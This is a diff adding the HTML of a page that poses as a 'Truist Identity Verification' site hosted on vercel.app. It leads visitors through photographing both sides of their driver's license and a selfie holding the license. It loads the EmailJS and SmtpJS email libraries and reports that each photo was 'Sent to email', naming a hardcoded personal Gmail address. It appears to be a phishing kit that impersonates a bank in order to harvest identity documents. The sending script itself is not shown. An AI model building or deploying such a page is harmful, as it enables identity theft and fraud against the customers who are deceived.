@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Truist Identity Verification</title>
+    <meta name="description" content="Secure identity verification system for Truist Bank customers">
+    <meta property="og:title" content="Truist Identity Verification">
+    <meta property="og:description" content="Verify your identity securely with Truist Bank">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://truist-identity-verification.vercel.app/truist-logo.svg">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- EmailJS library for email functionality -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <!-- SmtpJS for SMTP email sending -->
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+</head>
+<body>
+    <div class="container">        <header>
+            <div class="logo">
+                <img src="truist-logo.svg" alt="Truist Bank Logo">
+            </div>
+            <h1>Identity Verification</h1>
+        </header>
+
+        <main>
+            <div class="verification-card">
+                <div class="card-header">
+                    <h2>Secure Identity Verification</h2>
+                    <p>Please complete both steps to verify your identity</p>
+                </div>                <div class="verification-steps">
+                    <div class="step-indicator">
+                        <div class="step active">1</div>
+                        <div class="step">2</div>
+                        <div class="step">3</div>
+                        <div class="step">4</div>
+                    </div>
+                    <div class="step-labels">
+                        <span class="active">ID Front</span>
+                        <span>ID Back</span>
+                        <span>Selfie</span>
+                        <span>Complete</span>
+                    </div>
+                </div>
+                
+                <!-- Step 1: Front of ID -->
+                <div id="license-front-step" class="verification-section active">
+                    <h3>Capture Driver's License - Front Side</h3>
+                    <p>Please take a clear photo of the front of your driver's license.</p>
+                    
+                    <div class="camera-container" id="license-front-camera-container">
+                        <video id="license-front-camera" autoplay></video>
+                        <div class="camera-overlay">
+                            <div class="camera-guide id-guide">
+                                <div class="id-outline"></div>
+                            </div>
+                        </div>
+                        <canvas id="license-front-canvas" style="display: none;"></canvas>
+                    </div>
+                    
+                    <div id="license-front-preview" class="preview-container" style="display: none;">
+                        <div class="preview-header">
+                            <h4>Front Preview</h4>
+                            <button class="btn btn-icon" id="license-front-retake"><i class="fas fa-redo"></i></button>
+                        </div>
+                        <div class="preview-image">
+                            <img id="license-front-img" src="" alt="License Front Preview">
+                        </div>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" id="license-front-capture"><i class="fas fa-camera"></i> Capture Front</button>
+                        <button class="btn btn-success" id="license-front-submit" style="display: none;"><i class="fas fa-check"></i> Submit Front Photo</button>
+                    </div>
+                    
+                    <div class="email-status-front" style="display: none;">
+                        <p><i class="fas fa-spinner fa-spin"></i> Sending front ID photo...</p>
+                    </div>
+                </div>
+                
+                <!-- Step 2: Back of ID -->
+                <div id="license-back-step" class="verification-section">
+                    <h3>Capture Driver's License - Back Side</h3>
+                    <p>Please take a clear photo of the back of your driver's license.</p>
+                    
+                    <div class="camera-container" id="license-back-camera-container">
+                        <video id="license-back-camera" autoplay></video>
+                        <div class="camera-overlay">
+                            <div class="camera-guide id-guide">
+                                <div class="id-outline"></div>
+                            </div>
+                        </div>
+                        <canvas id="license-back-canvas" style="display: none;"></canvas>
+                    </div>
+                    
+                    <div id="license-back-preview" class="preview-container" style="display: none;">
+                        <div class="preview-header">
+                            <h4>Back Preview</h4>
+                            <button class="btn btn-icon" id="license-back-retake"><i class="fas fa-redo"></i></button>
+                        </div>
+                        <div class="preview-image">
+                            <img id="license-back-img" src="" alt="License Back Preview">
+                        </div>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" id="license-back-capture"><i class="fas fa-camera"></i> Capture Back</button>
+                        <button class="btn btn-success" id="license-back-submit" style="display: none;"><i class="fas fa-check"></i> Submit Back Photo</button>
+                    </div>
+                    
+                    <div class="email-status-back" style="display: none;">
+                        <p><i class="fas fa-spinner fa-spin"></i> Sending back ID photo...</p>
+                    </div>
+                </div>                <!-- Step 3: Selfie with ID -->
+                <div id="selfie-step" class="verification-section">
+                    <h3>Take a Selfie with Driver's License</h3>
+                    <p>Please take a clear selfie while holding your driver's license next to your face.</p>
+                    
+                    <div class="camera-container">
+                        <video id="camera-feed" autoplay></video>
+                        <div class="camera-overlay">
+                            <div class="camera-guide">
+                                <div class="face-outline"></div>
+                                <div class="id-outline"></div>
+                            </div>
+                        </div>
+                        <canvas id="photo-canvas" style="display: none;"></canvas>
+                    </div>
+                    
+                    <div id="selfie-preview" class="preview-container" style="display: none;">
+                        <div class="preview-header">
+                            <h4>Selfie Preview</h4>
+                            <button class="btn btn-icon" id="selfie-retake"><i class="fas fa-redo"></i></button>
+                        </div>
+                        <div class="preview-image">
+                            <img id="selfie-img" src="" alt="Selfie Preview">
+                        </div>
+                    </div>
+                    
+                    <div class="action-buttons">
+                        <button class="btn btn-primary" id="capture-btn"><i class="fas fa-camera"></i> Take Selfie</button>
+                        <button class="btn btn-success" id="selfie-submit" style="display: none;"><i class="fas fa-check"></i> Submit Selfie</button>
+                    </div>
+                    
+                    <div class="email-status-selfie" style="display: none;">
+                        <p><i class="fas fa-spinner fa-spin"></i> Sending selfie photo...</p>
+                    </div>
+                </div>                <!-- Step 4: Verification Complete -->
+                <div id="verification-complete" class="verification-section">
+                    <div class="success-animation">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h3>Verification Process Complete</h3>
+                    <p>All verification steps have been successfully completed. Verification emails have been sent with your submission details.</p>
+                    
+                    <div class="verification-summary">
+                        <h4>Submission Summary</h4>
+                        <div class="verification-info">
+                            <p><strong>Reference Number:</strong> <span id="reference-number"></span></p>
+                            <p><strong>Submission Date:</strong> <span id="submission-date"></span></p>
+                            <p><strong>Email:</strong> <span id="recipient-email">deliafmclinden@gmail.com</span></p>
+                        </div>
+                        
+                        <div class="verification-steps-complete">
+                            <p><i class="fas fa-check-circle"></i> <strong>ID Front:</strong> <span class="email-status-front-complete">Sent to email</span></p>
+                            <p><i class="fas fa-check-circle"></i> <strong>ID Back:</strong> <span class="email-status-back-complete">Sent to email</span></p>
+                            <p><i class="fas fa-check-circle"></i> <strong>Selfie:</strong> <span class="email-status-selfie-complete">Sent to email</span></p>
+                        </div>
+                    </div>
+                    
+                    <div class="email-form mt-3">
+                        <h4>Change Email Address</h4>
+                        <div class="email-input-group">
+                            <input type="email" id="email-input" placeholder="Enter your email address">
+                            <button class="btn btn-outline" id="update-email-btn">Update</button>
+                        </div>
+                        <p class="email-update-status"></p>
+                    </div>
+                    
+                    <button class="btn btn-primary" id="done-btn">Done</button>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <p>&copy; 2025 Truist Bank. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Help Center</a>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
